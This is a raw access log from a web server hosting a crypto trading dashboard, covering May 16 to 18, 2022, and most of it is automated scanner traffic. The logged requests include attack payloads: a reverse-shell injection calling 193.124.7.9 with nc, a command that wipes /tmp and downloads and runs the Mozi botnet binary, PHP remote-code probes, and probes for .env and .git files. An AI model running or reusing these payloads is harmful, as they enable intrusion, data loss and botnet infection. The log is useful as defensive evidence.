[16/May/2022 10:19:30] "GET /public/static/js/0.chunk.js HTTP/1.1" 304 0
[16/May/2022 10:19:30] "GET /public/static/js/bundle.js HTTP/1.1" 304 0
[16/May/2022 10:19:30] "GET /public/static/js/main.chunk.js HTTP/1.1" 304 0
Not Found: /sockjs-node
[16/May/2022 10:19:31] "GET /sockjs-node HTTP/1.1" 404 2187
[16/May/2022 10:19:31] "GET /api/authentication/getUser HTTP/1.1" 200 84
[16/May/2022 10:19:31] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.1" 304 0
[16/May/2022 10:19:31] "GET /public/assets/layout/images/appname-light.png HTTP/1.1" 304 0
[16/May/2022 10:19:31] "GET /public/assets/layout/images/profile-image.png HTTP/1.1" 304 0
[16/May/2022 10:19:31] "GET /public/assets/layout/images/logo-light.png HTTP/1.1" 304 0
[16/May/2022 10:19:31] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.1" 304 0
[16/May/2022 10:19:31] "POST /api/future_spot_summary/read HTTP/1.1" 200 32925
[16/May/2022 10:19:31] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.1" 304 0
[16/May/2022 10:19:31] "POST /api/future_candle_1m/read HTTP/1.1" 200 690048
[16/May/2022 10:19:31] "POST /api/spot_candle_1m/read HTTP/1.1" 200 658749
[16/May/2022 10:19:32] "POST /api/future_spot_diff/read HTTP/1.1" 200 708294
[16/May/2022 10:19:35] "GET /admin/ HTTP/1.1" 200 3042
[16/May/2022 10:19:35] "GET /public/admin/css/dashboard.css HTTP/1.1" 200 412
[16/May/2022 10:19:59] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 98399738
Not Found: /favicon.ico
[16/May/2022 10:20:05] "GET /favicon.ico HTTP/1.1" 404 2187
[16/May/2022 11:03:16] "GET /public/favicon.ico HTTP/1.0" 304 0
[16/May/2022 11:06:04] "GET / HTTP/1.0" 302 0
[16/May/2022 11:06:04] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[16/May/2022 11:06:04] "GET /HNAP1/ HTTP/1.0" 404 2166
Not Found: /onvif/device_service
[16/May/2022 11:17:05] "POST /onvif/device_service HTTP/1.0" 404 2209
Not Found: /onvif/device_service
[16/May/2022 11:17:14] "POST /onvif/device_service HTTP/1.0" 404 2209
[16/May/2022 12:34:35] "GET / HTTP/1.0" 302 0
[16/May/2022 12:38:37] "GET / HTTP/1.0" 302 0
[16/May/2022 13:09:48] "GET / HTTP/1.0" 302 0
[16/May/2022 13:09:48] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 13:14:38] "GET / HTTP/1.0" 302 0
[16/May/2022 13:31:24] "GET / HTTP/1.0" 302 0
[16/May/2022 13:50:13] "GET / HTTP/1.0" 302 0
[16/May/2022 13:54:04] "GET / HTTP/1.0" 302 0
[16/May/2022 14:13:47] "GET / HTTP/1.0" 302 0
Not Found: /incl/image_test.shtml
[16/May/2022 15:35:16] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 2369
[16/May/2022 15:42:45] "GET / HTTP/1.0" 302 0
[16/May/2022 15:52:09] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 16:31:15] "GET / HTTP/1.0" 302 0
[16/May/2022 16:32:27] "GET / HTTP/1.0" 302 0
[16/May/2022 16:32:27] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /Autodiscover/Autodiscover.xml
[16/May/2022 16:44:42] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
[16/May/2022 17:39:42] "GET / HTTP/1.0" 302 0
[16/May/2022 17:39:43] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 18:03:21] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[16/May/2022 18:03:21] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 18:20:41] "GET / HTTP/1.0" 302 0
[16/May/2022 18:20:42] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[16/May/2022 18:23:35] "GET /.env HTTP/1.0" 404 2160
[16/May/2022 18:23:36] "POST / HTTP/1.0" 302 0
[16/May/2022 19:53:55] "GET / HTTP/1.0" 302 0
[16/May/2022 19:53:55] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /phpmyadmin/
[16/May/2022 20:05:23] "GET /phpmyadmin/ HTTP/1.0" 404 2181
[16/May/2022 20:59:20] "HEAD / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 21:23:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[17/May/2022 00:10:11] "GET / HTTP/1.0" 302 0
[17/May/2022 00:27:22] "GET / HTTP/1.0" 302 0
Not Found: /boaform/admin/formLogin
[17/May/2022 00:40:42] "POST /boaform/admin/formLogin HTTP/1.0" 404 2218
Not Found: /.env
[17/May/2022 00:43:45] "GET /.env HTTP/1.0" 404 2160
[17/May/2022 01:14:10] "GET / HTTP/1.0" 302 0
[17/May/2022 01:14:10] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 01:31:19] "GET / HTTP/1.0" 302 0
[17/May/2022 01:33:11] "GET / HTTP/1.0" 302 0
[17/May/2022 01:42:07] "GET / HTTP/1.0" 302 0
[17/May/2022 01:42:07] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 01:46:58] "GET / HTTP/1.0" 302 0
[17/May/2022 01:46:58] "GET / HTTP/1.0" 302 0
Not Found: /feed/
[17/May/2022 01:46:58] "GET /feed/ HTTP/1.0" 404 2163
Not Found: /xmlrpc.php
[17/May/2022 01:46:58] "GET /xmlrpc.php?rsd HTTP/1.0" 404 2182
Not Found: /blog/wp-includes/wlwmanifest.xml
[17/May/2022 01:46:58] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /web/wp-includes/wlwmanifest.xml
[17/May/2022 01:46:59] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /wordpress/wp-includes/wlwmanifest.xml
[17/May/2022 01:46:59] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2259
Not Found: /wp/wp-includes/wlwmanifest.xml
[17/May/2022 01:46:59] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2238
Not Found: /2020/wp-includes/wlwmanifest.xml
[17/May/2022 01:46:59] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /2019/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:00] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /2021/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:00] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /shop/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:00] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /wp1/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:00] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /test/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:00] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /site/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:01] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /cms/wp-includes/wlwmanifest.xml
[17/May/2022 01:47:01] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 03:16:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[17/May/2022 03:18:53] "GET / HTTP/1.0" 302 0
Not Found: /onvif/device_service
[17/May/2022 03:30:17] "POST /onvif/device_service HTTP/1.0" 404 2209
[17/May/2022 03:48:43] "GET / HTTP/1.0" 302 0
[17/May/2022 03:48:44] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /favicon.ico
[17/May/2022 03:48:51] "GET /favicon.ico HTTP/1.0" 404 2181
[17/May/2022 03:57:34] "GET / HTTP/1.0" 302 0
[17/May/2022 03:57:35] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 04:13:42] "GET / HTTP/1.0" 302 0
[17/May/2022 04:17:21] "GET / HTTP/1.0" 302 0
[17/May/2022 04:17:22] "GET / HTTP/1.0" 302 0
[17/May/2022 04:17:22] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 04:55:18] "GET / HTTP/1.0" 302 0
[17/May/2022 04:55:19] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 05:26:22] "GET / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/May/2022 05:52:11] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
[17/May/2022 06:20:12] "GET / HTTP/1.0" 302 0
Not Found: /robots.txt
[17/May/2022 06:20:13] "GET /robots.txt HTTP/1.0" 404 2186
Not Found: /robots.txt
[17/May/2022 06:20:13] "GET /robots.txt HTTP/1.0" 404 2186
[17/May/2022 06:20:14] "GET / HTTP/1.0" 302 0
[17/May/2022 06:20:14] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 06:20:16] "GET /admin/login HTTP/1.0" 301 0
[17/May/2022 06:20:16] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[17/May/2022 06:20:16] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
Not Found: /sockjs-node
[17/May/2022 06:20:16] "GET /sockjs-node HTTP/1.0" 404 2189
[17/May/2022 06:20:16] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 06:20:16] "GET /admin/login/ HTTP/1.0" 200 1806
[17/May/2022 06:20:17] "GET / HTTP/1.0" 302 0
[17/May/2022 06:20:18] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/May/2022 06:27:36] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[17/May/2022 06:55:01] "GET / HTTP/1.0" 302 0
Not Found: /solr/admin/info/system
[17/May/2022 07:00:21] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /.git/config
[17/May/2022 07:03:51] "GET /.git/config HTTP/1.0" 404 2181
Not Found: /.env
[17/May/2022 07:21:54] "GET /.env HTTP/1.0" 404 2160
[17/May/2022 07:21:54] "POST / HTTP/1.0" 302 0
Not Found: /.env
[17/May/2022 07:27:20] "GET /.env HTTP/1.0" 404 2160
[17/May/2022 07:27:20] "POST / HTTP/1.0" 302 0
Not Found: /index.php
[17/May/2022 07:47:29] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[17/May/2022 08:07:31] "GET / HTTP/1.0" 302 0
[17/May/2022 08:11:07] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[17/May/2022 08:11:09] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 08:14:29] "GET /public/favicon.ico HTTP/1.0" 200 22382
[17/May/2022 08:27:03] "GET / HTTP/1.0" 302 0
[17/May/2022 08:55:34] "GET / HTTP/1.0" 302 0
[17/May/2022 09:12:49] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[17/May/2022 09:12:50] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /admin/config.php
[17/May/2022 09:16:30] "GET /admin/config.php HTTP/1.0" 404 3928
Not Found: /console/
[17/May/2022 09:45:13] "GET /console/ HTTP/1.0" 404 2172
Not Found: /fuN3
[17/May/2022 09:48:17] "GET /fuN3 HTTP/1.0" 404 2168
Not Found: /incl/image_test.shtml
[17/May/2022 10:01:23] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 2369
Not Found: /Autodiscover/Autodiscover.xml
[17/May/2022 10:25:10] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /.env
[17/May/2022 10:35:16] "GET /.env HTTP/1.0" 404 2160
[17/May/2022 10:37:49] "HEAD / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[17/May/2022 10:42:19] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[17/May/2022 11:30:53] "GET / HTTP/1.0" 302 0
[17/May/2022 11:42:16] "GET /public/favicon.ico HTTP/1.0" 200 22382
[17/May/2022 11:43:51] "GET / HTTP/1.0" 302 0
[17/May/2022 11:56:57] "GET / HTTP/1.0" 302 0
[17/May/2022 11:57:14] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 12:45:05] "GET / HTTP/1.0" 302 0
[17/May/2022 12:49:35] "GET / HTTP/1.0" 302 0
[17/May/2022 12:49:37] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 13:14:37] "GET / HTTP/1.0" 302 0
[17/May/2022 13:14:37] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 13:29:01] "GET / HTTP/1.0" 302 0
[17/May/2022 13:31:09] "GET / HTTP/1.0" 302 0
[17/May/2022 13:31:10] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /actuator/gateway/routes
[17/May/2022 13:48:44] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
Not Found: /.env
[17/May/2022 14:43:37] "GET /.env HTTP/1.0" 404 2160
[17/May/2022 14:43:38] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[17/May/2022 14:43:40] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 15:07:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[17/May/2022 15:50:57] "GET / HTTP/1.0" 302 0
[17/May/2022 15:50:57] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 15:53:11] "GET / HTTP/1.0" 302 0
Not Found: /shell
[17/May/2022 16:56:57] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.249.107.176:42321/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 2255
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[17/May/2022 17:30:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[17/May/2022 18:38:28] "GET / HTTP/1.0" 302 0
[17/May/2022 19:34:34] "GET / HTTP/1.0" 302 0
[17/May/2022 19:34:35] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 19:34:35] "GET /public/favicon.ico HTTP/1.0" 200 22382
[17/May/2022 19:51:12] "GET / HTTP/1.0" 302 0
[17/May/2022 19:51:12] "GET / HTTP/1.0" 302 0
Not Found: /wp-includes/wlwmanifest.xml
[17/May/2022 19:51:13] "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 2229
Not Found: /xmlrpc.php
[17/May/2022 19:51:13] "GET /xmlrpc.php?rsd HTTP/1.0" 404 2182
[17/May/2022 19:51:13] "GET / HTTP/1.0" 302 0
Not Found: /blog/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:13] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /web/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:14] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /wordpress/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:14] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2259
Not Found: /website/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:14] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2253
Not Found: /wp/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:14] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2238
Not Found: /news/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:15] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /2020/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:15] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /2019/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:15] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /shop/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:15] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /wp1/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:16] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /test/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:16] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /wp2/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:16] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /site/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:16] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
Not Found: /cms/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:17] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2241
Not Found: /sito/wp-includes/wlwmanifest.xml
[17/May/2022 19:51:17] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 2244
[17/May/2022 21:32:45] "GET / HTTP/1.0" 302 0
[17/May/2022 22:37:30] "GET / HTTP/1.0" 302 0
[17/May/2022 22:37:30] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 22:45:04] "HEAD / HTTP/1.0" 302 0
[17/May/2022 23:00:57] "GET / HTTP/1.0" 302 0
[17/May/2022 23:00:58] "GET / HTTP/1.0" 302 0
[17/May/2022 23:00:59] "GET /public/index.html HTTP/1.0" 200 2139
[17/May/2022 23:07:41] "GET / HTTP/1.0" 302 0
[17/May/2022 23:16:13] "HEAD / HTTP/1.0" 302 0
Not Found: /shell
[18/May/2022 00:14:54] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 2250
[18/May/2022 00:23:55] "HEAD / HTTP/1.0" 302 0
[18/May/2022 00:30:01] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[18/May/2022 00:30:03] "POST /HNAP1/ HTTP/1.0" 404 2167
[18/May/2022 02:18:54] "GET / HTTP/1.0" 302 0
[18/May/2022 02:18:54] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 02:29:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/May/2022 02:51:27] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/May/2022 03:23:25] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /solr/admin/info/system
